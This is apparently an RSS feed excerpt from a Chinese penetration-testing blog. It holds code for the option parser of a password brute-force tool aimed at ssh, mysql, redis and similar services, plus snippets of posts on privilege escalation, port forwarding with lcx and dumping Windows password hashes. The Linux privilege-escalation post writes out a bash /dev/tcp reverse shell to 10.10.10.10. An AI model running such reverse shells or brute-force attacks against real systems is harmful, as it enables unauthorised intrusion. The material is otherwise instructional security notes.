&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&amp;#34;Parser&amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> __init__(self):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> super(Parser, self)&lt;span style="color:#f92672">.&lt;/span>__init__()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>service_type_list &lt;span style="color:#f92672">=&lt;/span> [
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;ssh&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;telnet&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;ftp&amp;#34;&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#e6db74">&amp;#34;mysql&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;mssql&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;oracle&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;pgsql&amp;#34;&lt;/span>,&lt;span style="color:#e6db74">&amp;#34;redis&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> ]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>log_level &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#e6db74">&amp;#34;debug&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;info&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;warning&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;error&amp;#34;&lt;/span>, &lt;span style="color:#e6db74">&amp;#34;critical&amp;#34;&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> self&lt;span style="color:#f92672">.&lt;/span>example &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#34;&amp;#34;&amp;#34;Example:
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> &lt;/span>&lt;span style="color:#ae81ff">\r&lt;/span>&lt;span style="color:#e6db74"> python3 &lt;/span>&lt;span style="color:#e6db74">{}&lt;/span>&lt;span style="color:#e6db74"> -s ssh -i 123.123.123.123
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74"> &lt;/span>&lt;span style="color:#ae81ff">\r&lt;/span>&lt;span style="color:#e6db74"> python3 &lt;/span>&lt;span style="color:#e6db74">{}&lt;/span>&lt;span style="color:#e6db74"> -s ssh -i 123.123.123.123/24 -l root -p 123456&amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">parser&lt;/span>(self):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> parser &lt;span style="color:#f92672">=&lt;/span> argparse&lt;span style="color:#f92672">.&lt;/span>ArgumentParser(
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> formatter_class&lt;span style="color:#f92672">=&lt;/span>argparse&lt;span style="color:#f92672">.&lt;/span>RawDescriptionHelpFormatter,&lt;span style="color:#75715e">#使 example 可以换行&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> add_help&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#66d9ef">True&lt;/span>,
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># description = &amp;#34;常见服务口令爆破&amp;#34;,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> parser&lt;span style="color:#f92672">.&lt;/span>epilog &lt;span style="color:#f92672">=&lt;/span> self&lt;span style="color:#f92672">.&lt;/span>example&lt;span style="color:#f92672">.&lt;/span>format(parser&lt;span style="color:#f92672">.&lt;/span>prog,parser&lt;span style="color:#f92672">.&lt;/span>prog)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> parser&lt;span style="color:#f92672">.&lt;/span>add_argument(&lt;span style="color:#e6db74">&amp;#34;-i&amp;#34;&lt;/span>, dest&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;host&amp;#34;&lt;/span>, type&lt;span style="color:#f92672">=&lt;/span>str, 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> help&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Target ip&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> parser&lt;span style="color:#f92672">.&lt;/span>add_argument(&lt;span style="color:#e6db74">&amp;#34;-iL&amp;#34;&lt;/span>, dest&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;host_file&amp;#34;&lt;/span>, type&lt;span style="color:#f92672">=&lt;/span>str, 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> help&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Target file name, one ip per line&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> parser&lt;span style="color:#f92672">.&lt;/span>add_argument(&lt;span style="color:#e6db74">&amp;#34;-l&amp;#34;&lt;/span>, dest&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;user&amp;#34;&lt;/span>, type&lt;span style="color:#f92672">=&lt;/span>str, 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> help&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;username&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> parser&lt;span style="color:#f92672">.&lt;/span>add_argument(&lt;span style="color:#e6db74">&amp;#34;-p&amp;#34;&lt;/span>, dest&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;pwd&amp;#34;&lt;/span>, type&lt;span style="color:#f92672">=&lt;/span>str, 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> help&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;password&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> parser&lt;span style="color:#f92672">.&lt;/span>add_argument(&lt;span style="color:#e6db74">&amp;#34;-lp&amp;#34;&lt;/span>, dest&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;user_pwd_file&amp;#34;&lt;/span>, type&lt;span style="color:#f92672">=&lt;/span>str, 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> help&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;user_pwd file, example: username:password&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> parser&lt;span style="color:#f92672">.&lt;/span>add_argument(&lt;span style="color:#e6db74">&amp;#34;-L&amp;#34;&lt;/span>, dest&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;user_file&amp;#34;&lt;/span>, type&lt;span style="color:#f92672">=&lt;/span>str, 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> help&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;username file&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> parser&lt;span style="color:#f92672">.&lt;/span>add_argument(&lt;span style="color:#e6db74">&amp;#34;-P&amp;#34;&lt;/span>, dest&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;pwd_file&amp;#34;&lt;/span>, type&lt;span style="color:#f92672">=&lt;/span>str, 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> help&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;password file&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> parser&lt;span style="color:#f92672">.&lt;/span>add_argument(&lt;span style="color:#e6db74">&amp;#34;--port&amp;#34;&lt;/span>, dest&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;port&amp;#34;&lt;/span>, type&lt;span style="color:#f92672">=&lt;/span>int, 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> help&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Target port&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> parser&lt;span style="color:#f92672">.&lt;/span>add_argument(&lt;span style="color:#e6db74">&amp;#34;-s&amp;#34;&lt;/span>, dest&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;service_type&amp;#34;&lt;/span>, type&lt;span style="color:#f92672">=&lt;/span>str, required&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#66d9ef">True&lt;/span>, 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> choices&lt;span style="color:#f92672">=&lt;/span>self&lt;span style="color:#f92672">.&lt;/span>service_type_list, help&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Service type&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> parser&lt;span style="color:#f92672">.&lt;/span>add_argument(&lt;span style="color:#e6db74">&amp;#34;-t&amp;#34;&lt;/span>, dest&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;thread_num&amp;#34;&lt;/span>, type&lt;span style="color:#f92672">=&lt;/span>int, default&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">10&lt;/span>, 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> help&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;The number of threads, default is 10 threads&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> parser&lt;span style="color:#f92672">.&lt;/span>add_argument(&lt;span style="color:#e6db74">&amp;#34;-T&amp;#34;&lt;/span>, dest&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;timeout&amp;#34;&lt;/span>, type&lt;span style="color:#f92672">=&lt;/span>int, default&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">10&lt;/span>, 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> help&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Timeout, default is 10s&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> parser&lt;span style="color:#f92672">.&lt;/span>add_argument(&lt;span style="color:#e6db74">&amp;#34;-v&amp;#34;&lt;/span>, dest&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;log_level&amp;#34;&lt;/span>, type&lt;span style="color:#f92672">=&lt;/span>str, default&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;info&amp;#34;&lt;/span>, 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> choices&lt;span style="color:#f92672">=&lt;/span>self&lt;span style="color:#f92672">.&lt;/span>log_level, help&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Log Level, default is &amp;#39;info&amp;#39;&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># args = parser.parse_args()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># parser.print_help()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> parser
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#a6e22e">@staticmethod&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">def&lt;/span> &lt;span style="color:#a6e22e">init&lt;/span>():
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> parser &lt;span style="color:#f92672">=&lt;/span> Parser()&lt;span style="color:#f92672">.&lt;/span>parser()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> parser
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> __name__ &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#e6db74">&amp;#34;__main__&amp;#34;&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> parser &lt;span style="color:#f92672">=&lt;/span> Parser()&lt;span style="color:#f92672">.&lt;/span>init()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> args &lt;span style="color:#f92672">=&lt;/span> parser&lt;span style="color:#f92672">.&lt;/span>parse_args()
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> parser&lt;span style="color:#f92672">.&lt;/span>print_help()
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="0x02-运行">0x02 运行&lt;/h3>
&lt;pre tabindex="0">&lt;code>➜ python3 tmp.py
usage: tmp.py [-h] [-i HOST] [-iL HOST_FILE] [-l USER] [-p PWD]
 [-lp USER_PWD_FILE] [-L USER_FILE] [-P PWD_FILE] [--port PORT]
 -s {ssh,telnet,ftp,mysql,mssql,oracle,pgsql,redis}
 [-t THREAD_NUM] [-T TIMEOUT]
 [-v {debug,info,warning,error,critical}]
tmp.py: error: the following arguments are required: -s
&lt;/code>&lt;/pre>&lt;pre tabindex="0">&lt;code>➜ python3 tmp.py -s ssh
usage: tmp.py [-h] [-i HOST] [-iL HOST_FILE] [-l USER] [-p PWD]
 [-lp USER_PWD_FILE] [-L USER_FILE] [-P PWD_FILE] [--port PORT]
 -s {ssh,telnet,ftp,mysql,mssql,oracle,pgsql,redis}
 [-t THREAD_NUM] [-T TIMEOUT]
 [-v {debug,info,warning,error,critical}]

optional arguments:
 -h, --help show this help message and exit
 -i HOST Target ip
 -iL HOST_FILE Target file name, one ip per line
 -l USER username
 -p PWD password
 -lp USER_PWD_FILE user_pwd file, example: username:password
 -L USER_FILE username file
 -P PWD_FILE password file
 --port PORT Target port
 -s {ssh,telnet,ftp,mysql,mssql,oracle,pgsql,redis}
 Service type
 -t THREAD_NUM The number of threads, default is 10 threads
 -T TIMEOUT Timeout, default is 10s
 -v {debug,info,warning,error,critical}
 Log Level, default is &amp;#39;info&amp;#39;

Example:
 python3 tmp.py -s ssh -i 123.123.123.123
 python3 tmp.py -s ssh -i 123.123.123.123/24 -l root -p 123456
&lt;/code>&lt;/pre></description></item><item><title>BurpSuite 抓手机包</title><link>https://wyb0.cn/posts/2016/burpsuite-intercept-packets-of-phone/</link><pubDate>Sat, 13 Aug 2016 23:53:39 +0000</pubDate><guid>https://wyb0.cn/posts/2016/burpsuite-intercept-packets-of-phone/</guid><description>&lt;h3 id="0x00-环境设置">0x00 环境设置&lt;/h3>
&lt;p>Windows Phone手机和电脑处于同一无线环境下：
&lt;img src="https://wyb0.cn/img/post/burpsuite_pc_ip.png" alt="PC机的ip">
&lt;img src="https://wyb0.cn/img/post/burpsuite_ip_set.png" alt="IP设置">&lt;/p>
&lt;h3 id="0x01-burpsuite设置">0x01 BurpSuite设置&lt;/h3>
&lt;p>&lt;img src="https://wyb0.cn/img/post/burpsuite_set_phone_proxy1.png" alt="设置burpsuite抓8888端口的包1">
&lt;img src="https://wyb0.cn/img/post/burpsuite_set_phone_proxy2.png" alt="设置burpsuite抓8888端口的包2">&lt;/p>
&lt;h3 id="0x02-抓http包">0x02 抓HTTP包&lt;/h3>
&lt;p>&lt;img src="https://wyb0.cn/img/post/burpsuite_phone_visit_internet.png" alt="手机访问网络">
&lt;img src="https://wyb0.cn/img/post/burpsuite_get_phone_packet.png" alt="burpsuite抓手机包">&lt;/p>
&lt;h3 id="0x03-抓https包">0x03 抓HTTPS包&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>挂burpsuite的代理下载证书
&lt;img src="https://wyb0.cn/img/post/burpsuite_down_ca1.png" alt="下载证书1">
&lt;img src="https://wyb0.cn/img/post/burpsuite_down_ca2.png" alt="下载证书2">&lt;/p></description></item><item><title>Linux 下虚拟主机搭建多站点</title><link>https://wyb0.cn/posts/2016/linux-virtual-host-build-multi-site/</link><pubDate>Fri, 12 Aug 2016 08:39:35 +0000</pubDate><guid>https://wyb0.cn/posts/2016/linux-virtual-host-build-multi-site/</guid><description>&lt;p>环境：CentOS-6.5-x86_64-minimal&lt;/p>
&lt;h3 id="0x00-搭建lamp">0x00 搭建LAMP&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>安装Apache&lt;/p>
&lt;pre tabindex="0">&lt;code>yum install httpd
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>安装MySQL&lt;/p>
&lt;ul>
&lt;li>yum install mysql mysql-server&lt;/li>
&lt;li>设置数据库&lt;/li>
&lt;/ul>
&lt;pre tabindex="0">&lt;code>[reber@localhost conf]$ sudo mysql_secure_installation
# 更新root密码：
[reber@localhost conf]$ mysql -uroot –p
mysql&amp;gt; use mysql;
mysql&amp;gt; update user set password=password(&amp;#39;123456&amp;#39;) where user=&amp;#39;root&amp;#39;;
mysql&amp;gt; flush privileges; //不想重启mysql就使新密码生效就需要运行此命令刷新
mysql&amp;gt; insert into mysql.user(Host,User,Password) values(&amp;#34;localhost&amp;#34;,&amp;#34;blog&amp;#34;,password(&amp;#34;123456&amp;#34;));
# mysql&amp;gt; detele form mysql.user where User=&amp;#39;blog&amp;#39; and Host=&amp;#39;localhost&amp;#39;; //这步可以删除用户
mysql&amp;gt; flush privileges; //刷新
mysql&amp;gt; create database db_blog;
Query OK, 1 row affected (0.00 sec)
# 授权用户&amp;#34;blog&amp;#34;拥有db_blog数据库的所有权限
mysql&amp;gt; grant all privileges on db_blog.* to blog@localhost identified by &amp;#39;666666&amp;#39;;
mysql&amp;gt; flush privileges; //刷新
[reber@localhost conf]$ mysql –ublog –p //此时就需要用666666登陆数据库db_blog
&lt;/code>&lt;/pre>&lt;/li>
&lt;li>
&lt;p>安装PHP&lt;/p></description></item><item><title>Python 的 scapy 模块简单使用</title><link>https://wyb0.cn/posts/2016/python-module-scapy/</link><pubDate>Thu, 11 Aug 2016 23:26:39 +0000</pubDate><guid>https://wyb0.cn/posts/2016/python-module-scapy/</guid><description>&lt;h3 id="0x00-简单尝试">0x00 简单尝试&lt;/h3>
&lt;p>&lt;img src="https://wyb0.cn/img/post/scapy_establish_the_packet.png" alt="尝试构造数据包">&lt;/p>
&lt;h3 id="0x01-生成一组数据包">0x01 生成一组数据包&lt;/h3>
&lt;p>&lt;img src="https://wyb0.cn/img/post/scapy_create_a_set_of_packet.png" alt="生成一组数据包">&lt;/p>
&lt;h3 id="0x02-发送数据包">0x02 发送数据包&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>send发送数据包
&lt;img src="https://wyb0.cn/img/post/scapy_send_send_packet.png" alt="用send发送数据包">&lt;/p>
&lt;/li>
&lt;li>
&lt;p>sr1发送数据包
&lt;img src="https://wyb0.cn/img/post/scapy_sr1_send_packet.png" alt="用sr1发送数据包">&lt;/p>
&lt;/li>
&lt;li>
&lt;p>sr发送数据包
&lt;img src="https://wyb0.cn/img/post/scapy_sr_send_packet.png" alt="用sr1发送数据包">&lt;/p>
&lt;/li>
&lt;/ul>
&lt;h3 id="0x03-发送syn数据包">0x03 发送SYN数据包&lt;/h3>
&lt;p>&lt;img src="https://wyb0.cn/img/post/scapy_sr1_send_syn_packet.png" alt="用sr1发送syn数据包">&lt;/p>
&lt;p>&lt;img src="https://wyb0.cn/img/post/scapy_sr_send_syn_packet.png" alt="用sr发送syn数据包">&lt;/p>
&lt;h3 id="0x04-得到tcp内容">0x04 得到TCP内容&lt;/h3>
&lt;p>&lt;img src="https://wyb0.cn/img/post/scapy_get_tcp_content.png" alt="得到tcp内容">&lt;/p></description></item><item><title>Web常见漏洞脑图</title><link>https://wyb0.cn/posts/2016/mind-map-of-web-common-vulnerabilities/</link><pubDate>Thu, 11 Aug 2016 21:17:21 +0000</pubDate><guid>https://wyb0.cn/posts/2016/mind-map-of-web-common-vulnerabilities/</guid><description>&lt;h2 id="web常见漏洞">Web常见漏洞&lt;/h2>
&lt;p>&lt;a href="https://wyb0.cn/img/post/web_common_vulnerability_maps.png?_blank">&lt;img src="https://wyb0.cn/img/post/web_common_vulnerability_maps.png" alt="Web常见漏洞脑图">&lt;/a>&lt;/p></description></item><item><title>SSH 免密登录及 SSH 隧道</title><link>https://wyb0.cn/posts/2016/linux-ssh-connect/</link><pubDate>Wed, 10 Aug 2016 11:46:13 +0000</pubDate><guid>https://wyb0.cn/posts/2016/linux-ssh-connect/</guid><description>&lt;h3 id="0x00-ssh相关选项">0x00 SSH相关选项&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>-V 显示版本&lt;/p>
&lt;/li>
&lt;li>
&lt;p>-f 输入密码后进入后台模式&lt;/p>
&lt;/li>
&lt;li>
&lt;p>-N 不执行远程命令，一般与-f连用，用于端口转发&lt;/p>
&lt;/li>
&lt;li>
&lt;p>-C 压缩传输的数据，网速快时会影响速度&lt;/p></description></item><item><title>Linux 下系统漏洞提权</title><link>https://wyb0.cn/posts/2016/linux-use-system-vulnerabilities-elevate-privileges/</link><pubDate>Tue, 09 Aug 2016 19:23:13 +0000</pubDate><guid>https://wyb0.cn/posts/2016/linux-use-system-vulnerabilities-elevate-privileges/</guid><description>&lt;h3 id="0x00-linux下的提权">0x00 Linux下的提权&lt;/h3>
&lt;p>Linux下一般都是系统漏洞提权，分为以下几个步骤：&lt;/p>
&lt;pre tabindex="0">&lt;code>1. 获取系统版本号
2. 根据系统版本号找对应exp
3. 反弹shell
4. 尝试利用
&lt;/code>&lt;/pre>&lt;h3 id="0x01-提权">0x01 提权&lt;/h3>
&lt;ul>
&lt;li>获取系统版本号
&lt;ul>
&lt;li>获取发行版本
&lt;ul>
&lt;li>cat /etc/*-release&lt;/li>
&lt;li>cat /etc/issue&lt;/li>
&lt;li>cat /etc/lsb-release&lt;/li>
&lt;li>cat /etc/redhat-release&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>获取内核版本
&lt;ul>
&lt;li>cat /proc/version&lt;/li>
&lt;li>uname -a&lt;/li>
&lt;li>uname -mrs&lt;/li>
&lt;li>rpm -q kernel&lt;/li>
&lt;li>dmesg | grep Linux&lt;/li>
&lt;li>ls /boot | grep vmlinuz&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>根据系统版本号找对应exp
&lt;ul>
&lt;li>&lt;a href="http://www.exploit-db.com">http://www.exploit-db.com&lt;/a>&lt;/li>
&lt;li>&lt;a href="http://1337day.com">http://1337day.com&lt;/a>&lt;/li>
&lt;li>&lt;a href="http://www.securiteam.com">http://www.securiteam.com&lt;/a>&lt;/li>
&lt;li>&lt;a href="http://www.securityfocus.com">http://www.securityfocus.com&lt;/a>&lt;/li>
&lt;li>&lt;a href="http://www.exploitsearch.net">http://www.exploitsearch.net&lt;/a>&lt;/li>
&lt;li>&lt;a href="http://metasploit.com/modules">http://metasploit.com/modules&lt;/a>&lt;/li>
&lt;li>&lt;a href="http://securityreason.com">http://securityreason.com&lt;/a>&lt;/li>
&lt;li>&lt;a href="http://seclists.org/fulldisclosure">http://seclists.org/fulldisclosure&lt;/a>&lt;/li>
&lt;li>&lt;a href="http://www.google.com">http://www.google.com&lt;/a>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>反弹shell
&lt;ul>
&lt;li>本地：&lt;code>nc -l -p 8888&lt;/code>&lt;/li>
&lt;li>目标机器：&lt;code>/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.10.10/8888 0&amp;gt;&amp;amp;1&lt;/code>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>尝试利用&lt;/li>
&lt;/ul>
&lt;h3 id="0x02-实例">0x02 实例&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>得到系统版本号
&lt;img src="https://wyb0.cn/img/post/privilge_escalation_linux_get_sys_version.png" alt="得到系统版本号">&lt;/p></description></item><item><title>端口转发</title><link>https://wyb0.cn/posts/2016/port-forwarding/</link><pubDate>Mon, 08 Aug 2016 19:33:45 +0000</pubDate><guid>https://wyb0.cn/posts/2016/port-forwarding/</guid><description>&lt;h3 id="0x00-应用场景">0x00 应用场景&lt;/h3>
&lt;ul>
&lt;li>内网IP的80端口通过端口映射到了外网IP的80端口上&lt;/li>
&lt;li>内网的Web服务器通过外网IP反向代理(如Nginx)
也就是说Web服务器在内网中&lt;/li>
&lt;/ul>
&lt;h3 id="0x01-判断web是否为内网">0x01 判断Web是否为内网&lt;/h3>
&lt;ul>
&lt;li>向ping域名，查看IP是外网&lt;/li>
&lt;li>用webshell查看ip却是内网IP&lt;/li>
&lt;/ul>
&lt;h3 id="0x02-端口转发工具">0x02 端口转发工具&lt;/h3>
&lt;ul>
&lt;li>lcx&lt;/li>
&lt;li>htran&lt;/li>
&lt;li>&lt;a href="http://rootkiter.com/EarthWorm/?_blank">EarthWorm&lt;/a>&lt;/li>
&lt;li>netsh&lt;/li>
&lt;li>&lt;a href="https://github.com/sensepost/reGeorg?_blank">reGeorg&lt;/a>&lt;/li>
&lt;li>meterpreter porfwd&lt;/li>
&lt;/ul>
&lt;h3 id="0x03-lcx端口转发">0x03 lcx端口转发&lt;/h3>
&lt;ul>
&lt;li>Hacker：lcx.exe -listen 500 8888&lt;/li>
&lt;li>Victim：lcx.exe -slave hacker_ip 500 victim_ip 3389&lt;/li>
&lt;li>Hacker：cmd mstsc hacker_ip:500&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="https://wyb0.cn/img/post/privilge_escalation_win_hacker_run_lcx.png" alt="hacker运行lcx">
&lt;img src="https://wyb0.cn/img/post/privilge_escalation_win_vimctim_run_lcx.png" alt="vimctim端运行lcx">
&lt;img src="https://wyb0.cn/img/post/privilge_escalation_win_hacker_remote_conn.png" alt="hacker远程连接">
&lt;img src="https://wyb0.cn/img/post/privilge_escalation_win_hacker_remote_conn_success.png" alt="hacker远程连接成功">&lt;/p></description></item><item><title>导出 Windows 主机密码与开启 3389</title><link>https://wyb0.cn/posts/2016/export-host-password-and-open-3389/</link><pubDate>Mon, 08 Aug 2016 08:28:27 +0000</pubDate><guid>https://wyb0.cn/posts/2016/export-host-password-and-open-3389/</guid><description>&lt;h3 id="0x00-导出主机密码hash">0x00 导出主机密码hash&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>关于Windows的hash&lt;/p>
&lt;ul>
&lt;li>早期IBM设计的LM Hash算法存在弱点，微软在保持向后兼容性的同时提出了自己的挑战响应机制，即NTLM Hash&lt;/li>
&lt;li>Windows hash由LM HASH和NT HASH两部分组成，形式为：用户名称:RID:LM-HASH值:NT-HASH值&lt;/li>
&lt;li>存储Windows hash的sam文件位置为：C:\windows\system32\config\SAM&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>导出hash条件&lt;/p></description></item><item><title>Windows 下第三方服务提权</title><link>https://wyb0.cn/posts/2016/windows-use-third-party-server-elevate-privileges/</link><pubDate>Sun, 07 Aug 2016 23:38:58 +0000</pubDate><guid>https://wyb0.cn/posts/2016/windows-use-third-party-server-elevate-privileges/</guid><description>&lt;h3 id="0x00--mssql提权">0x00 MSSQL提权&lt;/h3>
&lt;p>MSSQL运行在system权限时才可以通过xp_cmdshell组件执行系统命令提权&lt;br>
提权条件：数据库账号是DBA权限&lt;/p></description></item><item><title>Windows 下系统漏洞提权</title><link>https://wyb0.cn/posts/2016/windows-use-system-vulnerabilities-elevate-privileges/</link><pubDate>Sun, 07 Aug 2016 21:31:35 +0000</pubDate><guid>https://wyb0.cn/posts/2016/windows-use-system-vulnerabilities-elevate-privileges/</guid><description>&lt;p>提权是在已经getshell但是权限不大的前提下做的&lt;/p>
&lt;h3 id="0x00-查看基本信息">0x00 查看基本信息&lt;/h3>
&lt;p>&lt;img src="https://wyb0.cn/img/post/privilge_escalation_win_view_msg1.png" alt="Windows系统漏洞提权-查看基本信息1">&lt;/p>
&lt;p>&lt;img src="https://wyb0.cn/img/post/privilge_escalation_win_view_msg2.png" alt="Windows系统漏洞提权-查看基本信息2">&lt;/p>
&lt;h3 id="0x01-使用cmd执行命令">0x01 使用cmd执行命令&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>尝试使用cmd执行命令
&lt;img src="https://wyb0.cn/img/post/privilge_escalation_win_try_use_cmd.png" alt="Windows系统漏洞提权-尝试使用cmd执行命令">&lt;/p>
